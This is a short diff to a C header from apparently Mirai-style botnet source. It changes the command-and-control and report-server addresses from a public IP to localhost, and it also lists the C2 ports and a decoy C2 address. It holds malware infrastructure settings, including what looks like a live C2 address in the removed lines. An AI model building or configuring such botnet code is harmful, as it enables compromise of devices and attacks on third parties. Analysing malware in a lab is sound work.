@@ -8,9 +8,9 @@
 #define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
 #define SINGLE_INSTANCE_PORT 58459
 
-#define CNC_IP          INET_ADDR(84,54,51,227)
+#define CNC_IP          INET_ADDR(127,0,0,1)
 #define CNC_PORT        1337
-#define REPORT_IP       INET_ADDR(84,54,51,227)
+#define REPORT_IP       INET_ADDR(127,0,0,1)
 #define REPORT_PORT     13379
 
 #define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
